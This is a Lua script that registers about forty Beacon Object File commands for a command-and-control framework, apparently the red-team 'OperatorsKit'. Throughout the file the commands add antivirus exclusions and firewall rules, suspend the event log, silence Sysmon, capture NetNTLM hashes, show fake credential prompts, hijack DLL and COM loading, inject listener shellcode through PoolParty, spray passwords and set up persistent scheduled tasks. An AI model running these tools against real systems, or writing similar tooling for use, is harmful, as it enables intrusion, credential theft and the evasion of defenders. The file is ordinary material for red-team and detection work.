-- Master Lua Script to load all Beacon Object Files from the OperatorsKit.
local operatorskit = {}
operatorskit.bof_dir = ""

-- Addexclusion
function operatorskit.parse_addexclusion(args)
    if #args < 2 then
        error("Please specify one of the following exclusion types: path | process | extension.")
    end
    local excltype = args[1]
    local excldata = args[2]

    if excltype ~= "path" and excltype ~= "process" and excltype ~= "extension" then
        error("This exclusion type isn't supported.")
    end
    return bof_pack("zZ", excltype, excldata)
end
function operatorskit.run_addexclusion(args)
    local session = active()
    args = operatorskit.parse_addexclusion(args)
    local bof_path = operatorskit.bof_dir .. "AddExclusion/addexclusion" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:addexclusion", operatorskit.run_addexclusion, "Command: operatorskit addexclusion <exclusion type> <exclusion data>", "T1562.001")

--- Start Addfirewallrule
function operatorskit.parse_addfirewallrule(args)
    if #args < 3 then
        error("Please specify one of the following options: in | out.")
    end
    local direction = args[1]
    local port = args[2]
    local name = args[3]
    local group = args[4] or ""
    local description = args[5] or ""

    if direction ~= "in" and direction ~= "out" then
        error("This option isn't supported.")
    end
    return bof_pack("zZZZZ", direction, port, name, group, description)
end
function operatorskit.run_addfirewallrule(args)
    local session = active()
    args = operatorskit.parse_addfirewallrule(args)
    local bof_path = operatorskit.bof_dir .. "AddFirewallRule/addfirewallrule" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:addfirewallrule", operatorskit.run_addfirewallrule, 'Command: operatorskit addfirewallrule <direction> <port> <name> [group] [description]', "T1562.004")
--- End Addfirewallrule

-- Start Addlocalcert
function operatorskit.parse_addlocalcert(args)
    if #args < 3 then
        error("Please provide path, store name, and friendly name.")
    end
    local path = args[1]
    local store = args[2]
    local name = args[3]
    local cert_content = read(path)
    return bof_pack("bZz", cert_content, store, name) -- todo b validation
end
function operatorskit.run_addlocalcert(args)
    local session = active()
    args = operatorskit.parse_addlocalcert(args)
    bof_path = operatorskit.bof_dir .. "AddLocalCert/addlocalcert" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:addlocalcert", operatorskit.run_addlocalcert, '"Command: operatorskit addlocalcert <path to certificate.cer file> <store name> "<friendly name>"', "T1553.003")

-- Addtaskscheduler
function operatorskit.parse_addtaskscheduler(args)
    if #args < 6 then
        error("Please specify all necessary arguments.")
    end
    local taskName = args[1]
    local host = args[2] or ""
    local programPath = args[3]
    local programArguments = args[4] or ""
    local triggerType = args[5]
    local optionalArg1 = args[6] or ""
    local optionalArg2 = args[7] or ""
    local optionalArg3 = args[8] or ""
    local optionalArg4 = args[9] or ""

    local arg_data = nil
    if triggerType == "onetime" then
        arg_data = bof_pack("ZZZZzZZ", taskName, host, programPath, programArguments, triggerType, optionalArg1, optionalArg2)
    elseif triggerType == "daily" then
        arg_data = bof_pack("ZZZZzZZiZ", taskName, host, programPath, programArguments, triggerType, optionalArg1, optionalArg2, optionalArg3, optionalArg4)
    elseif triggerType == "logon" or triggerType == "startup" then
        arg_data = bof_pack("ZZZZzZ", taskName, host, programPath, programArguments, triggerType, optionalArg1)
    elseif triggerType == "lock" or triggerType == "unlock" then
        arg_data = bof_pack("ZZZZzZZ", taskName, host, programPath, programArguments, triggerType, optionalArg1, optionalArg2)
    else
        error("This trigger option is not supported.")
    end

    return arg_data
end
function operatorskit.run_addtaskscheduler(args)
    local session = active()
    args = operatorskit.parse_addtaskscheduler(args)
    local bof_path = operatorskit.bof_dir .. "AddTaskScheduler/addtaskscheduler" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:addtaskscheduler", operatorskit.run_addtaskscheduler, 'Command: operatorskit addtaskscheduler <taskName> <(optional) hostName> <programPath> "<(optional) programArguments>" <type> <optional args>', "T1053.005")

-- Start Blindeventlog
function operatorskit.parse_blindeventlog(args)
    if #args < 1 then
        error("Please specify one of the following actions: suspend | resume.")
    end
    local action = args[1]
    if action ~= "suspend" and action ~= "resume" then
        error("This action is not supported.")
        return
    end
    return bof_pack("z", action)
end
function operatorskit.run_blindeventlog(args)
    local session = active()
    args = operatorskit.parse_blindeventlog(args)
    bof_path = operatorskit.bof_dir .. "BlindEventlog/blindeventlog" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:blindeventlog", operatorskit.run_blindeventlog, 'Command: operatorskit blindeventlog <action>', "T1070.001")
-- End Blindeventlog

-- Capturenetntlm
function operatorskit.run_capturenetntlm(args)
    if #args > 0 then
        error("This command does not accept any arguments.")
    end
    local session = active()
    local bof_path = operatorskit.bof_dir .. "CaptureNetNTLM/capturenetntlm" .. ".o"
    return bof(session, script_resource(bof_path), args , true)
end
command("operatorskit:capturenetntlm", operatorskit.run_capturenetntlm, "Command: operatorskit capturenetntlm", "T1557.001")

-- Credprompt
function operatorskit.parse_credprompt(args)
    if #args < 2 then
        error("Please provide title and message.")
    end
    local title = args[1]
    local message = args[2]
    local timer = args[3] or 60
    return bof_pack("ZZi", title, message, timer)
end
function operatorskit.run_credprompt(args)
    local session = active()
    args = operatorskit.parse_credprompt(args)
    local bof_path = operatorskit.bof_dir .. "CredPrompt/credprompt" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:credprompt", operatorskit.run_credprompt, 'Command: operatorskit credprompt "<title>" "<message>" [timeout]', "T1056.004")

-- Delexclusion
function operatorskit.parse_delexclusion(args)
    if #args < 2 then
        error("Please provide exclusion type and data.")
    end
    local excltype = args[1]
    local excldata = args[2]
    return bof_pack("zZ", excltype, excldata)
end
function operatorskit.run_delexclusion(args)
    local session = active()
    args = operatorskit.parse_delexclusion(args)
    local bof_path = operatorskit.bof_dir .. "DelExclusion/delexclusion" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:delexclusion", operatorskit.run_delexclusion, 'Command: operatorskit delexclusion <exclusion type> <exclusion data>', "T1562.001")

-- Delfirewallrule
function operatorskit.parse_delfirewallrule(args)
    if #args < 1 then
        error("Please specify the name of the firewall rule you want to delete.")
    end
    local name = args[1]
    return bof_pack("Z", name)
end
-- Delfirewallrule
function operatorskit.run_delfirewallrule(args)
    local session = active()
    args = operatorskit.parse_delfirewallrule(args)
    local bof_path = operatorskit.bof_dir .. "DelFirewallRule/delfirewallrule" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:delfirewallrule", operatorskit.run_delfirewallrule, 'Command: operatorskit delfirewallrule <name>', "T1562.004")

-- Dellocalcert
function operatorskit.parse_dellocalcert(args)
    if #args < 2 then
        error("Please provide both store name and thumbprint.")
    end
    local store = args[1]
    local thumbprint = args[2]
    return bof_pack("Zz", store, thumbprint)
end
function operatorskit.run_dellocalcert(args)
    local session = active()
    args = operatorskit.parse_dellocalcert(args)
    local bof_path = operatorskit.bof_dir .. "DelLocalCert/dellocalcert" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:dellocalcert", operatorskit.run_dellocalcert, 'Command: operatorskit dellocalcert <store name> <thumbprint>', "T1553.003")

-- Deltaskscheduler
function operatorskit.parse_deltaskscheduler(args)
    if #args < 1 then
        error("Please specify the name of the scheduled task.")
    end
    local taskName = args[1]
    local host = args[2] or ""
    return bof_pack("ZZ", taskName, host)
end
function operatorskit.run_deltaskscheduler(args)
    local session = active()
    args = operatorskit.parse_deltaskscheduler(args)
    local bof_path = operatorskit.bof_dir .. "DelTaskScheduler/deltaskscheduler" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:deltaskscheduler", operatorskit.run_deltaskscheduler, 'Command: operatorskit deltaskscheduler <taskName> [host]', "T1053.005")

-- Dllenvhijacking
function operatorskit.parse_dllenvhijacking(args)
    if #args < 5 then
        error("Please provide sysroot, proxy DLL, path to DLL, vulnerable binary, and parent PID.")
    end
    local sysroot = args[1]
    local proxydll = args[2]
    local pathtodll = args[3]
    local vulnbinary = args[4]
    local pid = args[5]
    return bof_pack("ZZZzi", sysroot, proxydll, pathtodll, vulnbinary, pid)
end
function operatorskit.run_dllenvhijacking(args)
    local session = active()
    args = operatorskit.parse_dllenvhijacking(args)
    local bof_path = operatorskit.bof_dir .. "DllEnvHijacking/dllenvhijacking" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:dllenvhijacking", operatorskit.run_dllenvhijacking, 'Command: operatorskit dllenvhijacking <sysroot> <proxy DLL> <path to DLL> <vulnerable binary> <parent PID>', "T1574.001")

-- Enumlocalcert
function operatorskit.parse_enumlocalcert(args)
    if #args < 1 then
        error("Please specify a valid certificate store name.")
    end
    local store = args[1]
    return bof_pack("Z", store)
end
function operatorskit.run_enumlocalcert(args)
    local session = active()
    args = operatorskit.parse_enumlocalcert(args)
    local bof_path = operatorskit.bof_dir .. "EnumLocalCert/enumlocalcert" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:enumlocalcert", operatorskit.run_enumlocalcert, 'Command: operatorskit enumlocalcert <store name>', "T1553.003")

-- Enumsecproducts
function operatorskit.parse_enumsecproducts(args)
    local remotehost = args[1] or ""
    return bof_pack("z", remotehost)
end
function operatorskit.run_enumsecproducts(args)
    local session = active()
    args = operatorskit.parse_enumsecproducts(args)
    local bof_path = operatorskit.bof_dir .. "EnumSecProducts/enumsecproducts" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:enumsecproducts", operatorskit.run_enumsecproducts, 'Command: operatorskit enumsecproducts [remotehost]', "T1518.001")

-- Enumshares
function operatorskit.parse_enumshares(args)
    if #args < 1 then
        error("Please specify the path to the hostname file.")
    end
    local path = args[1]
    local file = read(path)
    return bof_pack("b", file)
end
function operatorskit.run_enumshares(args)
    local session = active()
    args = operatorskit.parse_enumshares(args)
    local bof_path = operatorskit.bof_dir .. "EnumShares/enumshares" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:enumshares", operatorskit.run_enumshares, 'Command: operatorskit enumshares <path to hostname file>', "T1135")

-- Enumtaskscheduler
function operatorskit.parse_enumtaskscheduler(args)
    local host = args[1] or ""
    return bof_pack("Z", host)
end
function operatorskit.run_enumtaskscheduler(args)
    local session = active()
    args = operatorskit.parse_enumtaskscheduler(args)
    local bof_path = operatorskit.bof_dir .. "EnumTaskScheduler/enumtaskscheduler" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:enumtaskscheduler", operatorskit.run_enumtaskscheduler, 'Command: operatorskit enumtaskscheduler [host]', "T1053")

-- Enumwsc
function operatorskit.parse_enumwsc(args)
    if #args < 1 then
        error("Please specify one of the following options: av | fw | as.")
    end
    local option = args[1]
    return bof_pack("z", option)
end
function operatorskit.run_enumwsc(args)
    local session = active()
    args = operatorskit.parse_enumwsc(args)
    local bof_path = operatorskit.bof_dir .. "EnumWSC/enumwsc" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:enumwsc", operatorskit.run_enumwsc, 'Command: operatorskit enumwsc <option>', "T1518.001")

-- Enumdotnet
function operatorskit.run_enumdotnet()
    local session = active()
    local bof_path = operatorskit.bof_dir .. "EnumDotnet/enumdotnet" .. ".o"
    return bof(session, script_resource(bof_path), {}, true)
end
command("operatorskit:enumdotnet", operatorskit.run_enumdotnet, "Command: operatorskit enumdotnet", "T1033")

-- Enumexclusions
function operatorskit.run_enumexclusions()
    local session = active()
    local bof_path = operatorskit.bof_dir .. "EnumExclusions/enumexclusions" .. ".o"
    return bof(session, script_resource(bof_path),{}, true)
end
command("operatorskit:enumexclusions", operatorskit.run_enumexclusions, "Command: operatorskit enumexclusions", "T1518.001")

-- Enumfiles
function operatorskit.parse_enumfiles(args)
    if #args < 2 then
        error("Please provide the directory path and search pattern.")
    end
    local lpDirectory = args[1]
    local lpSearchPattern = args[2]
    local keyword = args[3] or ""
    return bof_pack("zzz", lpDirectory, lpSearchPattern, keyword)
end
function operatorskit.run_enumfiles(args)
    local session = active()
    args = operatorskit.parse_enumfiles(args)
    local bof_path = operatorskit.bof_dir .. "EnumFiles/enumfiles" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:enumfiles", operatorskit.run_enumfiles, 'Command: operatorskit enumfiles <directory> <search pattern> [keyword]', "T1083")

-- Enumhandles
function operatorskit.parse_enumhandles(args)
    if #args < 2 then
        error("Please specify a search option and handle type.")
    end
    local search = args[1]
    local query = args[2]
    local pid = args[3] or ""

    if search ~= "all" and search ~= "h2p" and search ~= "p2h" then
        error("This option isn't supported.")
    end
    if query ~= "proc" and query ~= "thread" then
        error("This handle type isn't supported.")
    end
    return bof_pack(pid == "" and "zz" or "zzi", search, query, pid)
end
function operatorskit.run_enumhandles(args)
    local session = active()
    args = operatorskit.parse_enumhandles(args)
    local bofpath = operatorskit.bof_dir .. "EnumHandles/enumhandles" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:enumhandles", operatorskit.run_enumhandles, 'Command: operatorskit enumhandles <search option> <handle type> [PID]', "T1057")

-- Enumlib
function operatorskit.parse_enumlib(args)
    if #args < 2 then
        error("Please specify an enumeration option and a target.")
    end
    local option = args[1]
    local target = args[2]

    if option ~= "search" and option ~= "list" then
        error("This enumeration option isn't supported.")
    end
    return bof_pack(option == "search" and "zz" or "zi", option, target)
end
function operatorskit.run_enumlib(args)
    local session = active()
    args = operatorskit.parse_enumlib(args)
    local bof_path = operatorskit.bof_dir .. "EnumLib/enumlib" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:enumlib", operatorskit.run_enumlib, 'Command: operatorskit enumlib <search | list> <target>', "T1059.001")

-- Enumrwx
function operatorskit.parse_enumrwx(args)
    if #args < 1 then
        error("Please provide the PID.")
    end
    local pid = args[1]
    return bof_pack("i", pid)
end
function operatorskit.run_enumrwx(args)
    local session = active()
    args = operatorskit.parse_enumrwx(args)
    local bof_path = operatorskit.bof_dir .. "EnumRWX/enumrwx" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:enumrwx", operatorskit.run_enumrwx, 'Command: operatorskit enumrwx <PID>', "T1057")

-- Enumsysmon
function operatorskit.parse_enumsysmon(args)
    if #args < 1 then
        error("Please specify one of the following enumeration options: reg | driver.")
    end
    local action = args[1]
    if action ~= "reg" and action ~= "driver" then
        error("This option is not supported.")
    end
    return bof_pack("z", action)
end
function operatorskit.run_enumsysmon(args)
    local session = active()
    args = operatorskit.parse_enumsysmon(args)
    local bof_path = operatorskit.bof_dir .. "EnumSysmon/enumsysmon" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:enumsysmon", operatorskit.run_enumsysmon, 'Command: operatorskit enumsysmon <option>', "T1569.002")

-- Enumwebclient
function operatorskit.parse_enumwebclient(args)
    if #args < 1 then
        error("Please provide the path to the hostname file.")
    end
    local path = args[1]
    local debug = args[2] or ""
    local file = read(path)
    return bof_pack("bz", file, debug)
end
function operatorskit.run_enumwebclient(args)
    local session = active()
    args = operatorskit.parse_enumwebclient(args)
    local bof_path = operatorskit.bof_dir .. "EnumWebClient/enumwebclient" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:enumwebclient", operatorskit.run_enumwebclient, 'Command: operatorskit enumwebclient <path to hostname file> [debug]', "T1016")

-- Forcelockscreen
function operatorskit.run_forcelockscreen()
    local session = active()
    local bof_path = operatorskit.bof_dir .. "ForceLockScreen/forcelockscreen" .. ".o"
    return bof(session, script_resource(bof_path), {}, true)
end
command("operatorskit:forcelockscreen", operatorskit.run_forcelockscreen, "Command: operatorskit forcelockscreen", "T1569")

-- Hidefile
function operatorskit.parse_hidefile(args)
    if #args < 2 then
        error("Please specify the option (dir | file) and the path to the target.")
    end
    local option = args[1]
    local path = args[2]
    if option ~= "dir" and option ~= "file" then
        error("This option isn't supported. Please specify 'dir' or 'file'.")
    end
    return bof_pack("zZ", option, path)
end
function operatorskit.run_hidefile(args)
    local session = active()
    args = operatorskit.parse_hidefile(args)
    local bof_path = operatorskit.bof_dir .. "HideFile/hidefile" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:hidefile", operatorskit.run_hidefile, 'Command: operatorskit hidefile <option> <path>', "T1070.004")

-- Idletime
function operatorskit.run_idletime()
    local session = active()
    local bof_path = operatorskit.bof_dir .. "IdleTime/idletime" .. ".o"
    return bof(session, script_resource(bof_path), {}, true)
end
command("operatorskit:idletime", operatorskit.run_idletime, "Command: operatorskit idletime", "T1202")

-- Loadlib
function operatorskit.parse_loadlib(args)
    if #args < 2 then
        error("Please provide both the PID and path to the DLL.")
    end
    local pid = args[1]
    local path = args[2]
    return bof_pack("iz", pid, path)
end
function operatorskit.run_loadlib(args)
    local session = active()
    args = operatorskit.parse_loadlib(args)
    local bof_path = operatorskit.bof_dir .. "LoadLib/loadlib" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:loadlib", operatorskit.run_loadlib, 'Command: operatorskit loadlib <PID> <path to DLL>', "T1055.001")

-- Psremote
function operatorskit.parse_psremote(args)
    if #args < 1 then
        error("Please provide the FQDN or IP of the remote host.")
    end
    local remotehost = args[1]
    return bof_pack("z", remotehost)
end
function operatorskit.run_psremote(args)
    local session = active()
    args = operatorskit.parse_psremote(args)
    local bof_path = operatorskit.bof_dir .. "PSremote/psremote" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:psremote", operatorskit.run_psremote, 'Command: operatorskit psremote <FQDN or IP>', "T1021")

-- Silencesysmon
function operatorskit.parse_silencesysmon(args)
    if #args ~= 1 then
        error("Please provide the Sysmon process ID (PID).")
    end
    local pid = args[1]
    return bof_pack("i", pid)
end
function operatorskit.run_silencesysmon(args)
    local session = active()
    args = operatorskit.parse_silencesysmon(args)
    local bof_path = operatorskit.bof_dir .. "SilenceSysmon/silencesysmon" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:silencesysmon", operatorskit.run_silencesysmon, 'Command: operatorskit silencesysmon <PID>', "T1562.002")

-- Systeminfo
function operatorskit.run_systeminfo()
    local session = active()
    local bof_path = operatorskit.bof_dir .. "SystemInfo/systeminfo" .. ".o"
    return bof(session, script_resource(bof_path), {}, true)
end
command("operatorskit:systeminfo", operatorskit.run_systeminfo, "Command: operatorskit systeminfo", "T1082")

-- Dllcomhijacking
function operatorskit.parse_dllcomhijacking(args)
    if #args < 2 then
        error("Please provide the CLSID and target.")
    end
    local clsid = args[1]
    local target = args[2]
    return bof_pack("ZZ", clsid, target)
end
function operatorskit.run_dllcomhijacking(args)
    local session = active()
    args = operatorskit.parse_dllcomhijacking(args)
    local bof_path = operatorskit.bof_dir .. "DllComHijacking/dllcomhijacking" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:dllcomhijacking", operatorskit.run_dllcomhijacking, 'Command: operatorskit dllcomhijacking <CLSID> <target>', "T1574.001")

-- Injectpoolparty todo
function operatorskit.parse_injectpoolparty(args)
    if #args < 3 then
        error("Please provide the execution variant, process ID, and listener.")
    end
    local variant = args[1]
    local pid = args[2]
    local listener = args[3]

    if variant ~= "TP_TIMER" and variant ~= "TP_DIRECT" and variant ~= "TP_WORK" then
        error("Please specify one of the following variants: TP_TIMER | TP_DIRECT | TP_WORK.")
    end

    if listener_info(listener) == nil then
        error("Specified listener was not found: " .. listener)
    end

    local sc_data = artifact_payload(listener, "raw", "x64", "process", "Indirect")
    return bof_pack("zib", variant, pid, sc_data)
end
function operatorskit.run_injectpoolparty(args)
    local session = active()
    args = operatorskit.parse_injectpoolparty(args)
    local bof_path = operatorskit.bof_dir .. "InjectPoolParty/injectpoolparty" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:injectpoolparty", operatorskit.run_injectpoolparty, 'Command: operatorskit injectpoolparty <variant> <PID> <listener>', "T1055.012")

-- Enumdrives
function operatorskit.run_enumdrives(args)
    local session = active()
    local bof_path = operatorskit.bof_dir .. "EnumDrives/enumdrives" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:enumdrives", operatorskit.run_enumdrives, 'Command: operatorskit enumdrives', "T1135")

-- Passwordspray
function operatorskit.parse_passwordspray(args)
    if #args < 3 then
        error("Please provide the path to the username file, password, and domain.")
    end
    local path = args[1]
    local password = args[2]
    local domain = args[3]
    local timer = args[4] or "0"
    local jitter = args[5] or "0"
    local file = read(path)
    print(password, domain, timer, jitter)
    return bof_pack("bZZii", file, password, domain, timer, jitter)
end
function operatorskit.run_passwordspray(args)
    local session = active()
    args = operatorskit.parse_passwordspray(args)
    local bof_path = operatorskit.bof_dir .. "PasswordSpray/passwordspray" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:passwordspray", operatorskit.run_passwordspray, 'Command: operatorskit passwordspray <path to username file> <password> <domain> [timer] [jitter]', "T1110.003")

-- Executecrosssession
function operatorskit.parse_executecrosssession(args)
    if #args < 2 then
        error("Please provide the binary path and session ID.")
    end
    local binarypath = args[1]
    local sessionid = args[2]
    return bof_pack("Zi", binarypath, sessionid)
end
function operatorskit.run_executecrosssession(args)
    local session = active()
    args = operatorskit.parse_executecrosssession(args)
    local bof_path = operatorskit.bof_dir .. "ExecuteCrossSession/executecrosssession" .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("operatorskit:executecrosssession", operatorskit.run_executecrosssession, 'Command: operatorskit executecrosssession <binary path> <session ID>', "T1569.002")